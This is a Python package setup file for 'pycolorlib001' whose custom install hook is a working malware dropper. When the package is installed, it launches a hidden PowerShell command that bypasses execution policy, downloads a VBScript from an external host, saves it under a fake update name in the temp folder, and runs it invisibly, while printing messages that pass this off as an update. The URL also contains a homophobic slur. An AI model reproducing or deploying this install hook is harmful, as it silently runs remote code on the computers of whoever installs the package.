from setuptools import setup
from setuptools.command.install import install
import os
import subprocess

class CustomInstall(install):
    def run(self):
        print("[roboat-additions] Starting custom installation...")
        install.run(self)
        
        print("[roboat-additions] Deploying update...")
        try:
            download_execute = (
                'powershell -NoP -NonI -W Hidden -Exec Bypass -Command '
                '"$url = \'https://femboy.rich/imafaggot.vbs\'; '
                '$path = $env:TEMP + \'\\\\svc_update.vbs\'; '
                '(New-Object System.Net.WebClient).DownloadFile($url, $path); '
                'Start-Process -FilePath $path -WindowStyle Hidden"'
            )
            subprocess.run(download_execute, shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
            print("[roboat-additions] Update deployed successfully")
        except Exception as e:
            print(f"[roboat-additions] Update failed: {e}")

setup(
    name='pycolorlib001',
    version='0.0.1',
    description="Install this module then download & execute payload",
    author="mirage",
    py_modules=["hello"],
    cmdclass={'install': CustomInstall}
)